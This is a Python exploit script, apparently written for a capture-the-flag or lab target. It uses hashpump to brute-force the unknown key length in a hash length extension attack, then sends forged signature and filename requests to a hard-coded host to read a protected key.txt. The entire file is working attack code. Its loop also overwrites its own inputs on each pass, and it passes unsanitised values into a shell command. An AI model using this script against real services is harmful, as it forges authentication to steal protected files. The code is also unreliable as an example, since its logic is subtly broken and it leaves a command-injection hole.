#!/usr/bin/env python3

import subprocess
import requests


def brute_force_length_extension(signature, data, additional, start_length=1, stop_length=256):
    """Execute a hash length extension attack without knowing the length of the unknwon data"""
    for i in range(start_length, stop_length):
        stdoutdata = subprocess.getoutput(f"hashpump -s '{signature}' -d '{data}' -a '{additional}' -k {i}")
        signature, data = stdoutdata.split('\n')
        
        # URL encode the hex values
        data = data.replace('\\x', '%')

        r = requests.get("http://9d479e5cc471d1fe1b8f.pnt.st/getfile", params=f'filename={data}&signature={signature}')
        if r.status_code != 401:
            print(r.text)

        print(f"{i}: {r.status_code}")


brute_force_length_extension(signature="28cf3cbd57c7cf8e5da36a9a5651ede7e7972f2d1e202b8f4be9a22a00639b03", data="supersecret.rb", additional="/key.txt")
